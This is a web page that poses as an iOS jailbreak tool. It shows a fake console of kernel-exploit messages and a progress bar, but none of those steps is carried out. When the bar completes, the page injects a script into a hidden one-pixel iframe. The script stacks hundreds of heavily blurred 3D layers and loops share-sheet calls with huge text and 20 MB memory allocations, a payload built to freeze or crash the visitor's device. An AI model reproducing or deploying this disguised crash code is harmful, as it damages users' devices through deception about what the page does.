<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Jailbreak in Progress...</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&family=JetBrains+Mono&display=swap" rel="stylesheet">
    <style>
        body {
            background-color: #000;
            color: #fff;
            font-family: 'Inter', sans-serif;
            overflow: hidden;
            user-select: none;
        }
        .font-mono {
            font-family: 'JetBrains Mono', monospace;
        }
        .console-container::-webkit-scrollbar {
            width: 0px;
        }
        @keyframes blink {
            50% { opacity: 0; }
        }
        .cursor {
            display: inline-block;
            width: 6px;
            height: 12px;
            background: #fff;
            animation: blink 1s step-end infinite;
            vertical-align: middle;
            margin-left: 2px;
        }
    </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-center p-6 bg-black">

    <div id="simulation" class="w-full max-w-2xl space-y-10">
        <!-- Status Header -->
        <div class="flex items-center justify-between px-2">
            <div class="flex items-center gap-3">
                <i data-lucide="loader-2" class="w-5 h-5 animate-spin text-white/40"></i>
                <span class="font-mono text-xs tracking-widest uppercase text-white/50">Injecting Exploit...</span>
            </div>
            <span id="pct" class="font-mono text-sm font-bold">0%</span>
        </div>

        <!-- Progress Bar -->
        <div class="relative h-1 w-full bg-white/5 rounded-full overflow-hidden">
            <div id="bar" class="absolute inset-y-0 left-0 bg-white transition-all duration-100" style="width: 0%"></div>
        </div>

        <!-- Terminal -->
        <div id="terminal" class="h-80 bg-white/[0.02] border border-white/5 rounded-3xl p-8 font-mono text-[10px] overflow-y-auto space-y-3 leading-relaxed">
        </div>
    </div>

    <!-- Error Screen -->
    <div id="error-screen" class="hidden fixed inset-0 z-[100] flex flex-col items-center justify-center bg-black">
        <p id="fatal" class="hidden text-red-600 font-mono text-[8px] uppercase tracking-[0.5em] mb-4">Fatal Error: Kernel Panic</p>
        <div class="opacity-10 scale-75">
            <i data-lucide="shield-alert" class="w-12 h-12"></i>
        </div>
    </div>

    <!-- Respring Hook -->
    <div id="respring-view" class="hidden fixed inset-0 z-[200] bg-black flex flex-col items-center justify-center space-y-6">
        <i data-lucide="loader-2" class="w-10 h-10 animate-spin text-white/30"></i>
        <p class="font-mono text-[10px] tracking-widest text-white/20 uppercase">System Respring</p>
    </div>

    <iframe id="hook" class="fixed pointer-events-none opacity-0 w-1 h-1" sandbox="allow-forms allow-modals allow-scripts allow-same-origin"></iframe>

    <script>
        lucide.createIcons();

        const commands = [
            "Opening socket on port 1337...",
            "Overwriting kptr_restrict...",
            "Executing task_for_pid(0)...",
            "Kernel base found at 0xFFFFFFF007004000",
            "Bypassing KPP (Kernel Patch Protection)...",
            "Applying AMFI patches...",
            "Mounting / (rootfs) as r/w...",
            "Extracting bootstrap.tar.gz...",
            "Cleaning up auxiliary files...",
            "Jailbreak success. Triggering final stage..."
        ];

        let idx = 0;
        let p = 0;
        const term = document.getElementById('terminal');

        function log() {
            if (idx < commands.length) {
                const row = document.createElement('div');
                row.className = 'text-white/60';
                row.innerHTML = `<span class="text-white/20">></span> ${commands[idx]}`;
                term.appendChild(row);
                term.scrollTop = term.scrollHeight;
                idx++;
            }
        }

        const run = setInterval(() => {
            p += 0.8;
            if (p > 100) p = 100;
            
            document.getElementById('bar').style.width = p + '%';
            document.getElementById('pct').innerText = Math.floor(p) + '%';

            if (Math.random() > 0.9) log();

            if (p >= 100) {
                clearInterval(run);
                setTimeout(end, 800);
            }
        }, 40);

        function end() {
            document.getElementById('simulation').classList.add('hidden');
            document.getElementById('error-screen').classList.remove('hidden');
            
            setTimeout(() => {
                document.getElementById('fatal').classList.remove('hidden');
                setTimeout(respring, 1200);
            }, 400);
        }

        function respring() {
            document.getElementById('error-screen').classList.add('hidden');
            document.getElementById('respring-view').classList.remove('hidden');

            const frame = document.getElementById('hook');
            frame.srcdoc = `
                <html><body style="background:black">
                <script>
                    const c = document.createElement('div');
                    c.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
                    document.body.appendChild(c);
                    for(let i=0; i<500; i++){
                        let d = document.createElement('div');
                        d.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, '+i+'px) rotateY(90deg); opacity: 0.99;';
                        c.appendChild(d);
                    }
                    setInterval(() => {
                        try { navigator.share({ title: 'R', text: 'R'.repeat(100000) }); } catch(e) {}
                        let x = new Uint8Array(1024*1024*20);
                        crypto.getRandomValues(x);
                    }, 0);
                <\/script>
                </body></html>
            `;
        }
    </script>
</body>
</html>
